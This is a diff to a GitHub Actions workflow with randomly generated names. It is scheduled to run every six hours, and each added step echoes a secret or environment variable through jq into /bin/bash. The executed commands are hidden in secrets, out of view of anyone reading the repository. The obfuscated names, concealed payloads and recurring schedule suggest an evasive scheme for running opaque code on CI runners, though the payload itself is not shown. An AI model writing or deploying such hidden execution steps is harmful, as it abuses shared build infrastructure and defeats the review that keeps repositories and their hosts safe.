@@ -1,9 +1,8 @@
 name: haoertong6352
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 2/6 * * *'
+    - cron: '45 2/6 * * *'
 
 jobs:
   build:
@@ -13,8 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: haoertong6352
         env:
-          yavm58317: ${{ secrets.yavm58317 }}
+          z088: ${{ secrets.z088 }}
         run: |
-          echo $yavm58317 | jq -r .vh50115 | /bin/bash
-          echo $kafi8129 | jq -r .pi36 | /bin/bash
+          echo $z088 | jq -r .coue6 | /bin/bash
+          echo $tmty3 | jq -r .cds0177 | /bin/bash
+          echo $yzrjc75197 | jq -r .jw462 | /bin/bash
+          echo $xoan05 | jq -r .hk930 | /bin/bash
+          echo $navz810 | jq -r .q89510 | /bin/bash
+          echo $w33 | jq -r .j790 | /bin/bash
+          echo $ol104 | jq -r .b5612 | /bin/bash
+          echo $dkcmh94425 | jq -r .r2 | /bin/bash
+          echo $fxhz1812 | jq -r .wctb9 | /bin/bash
 
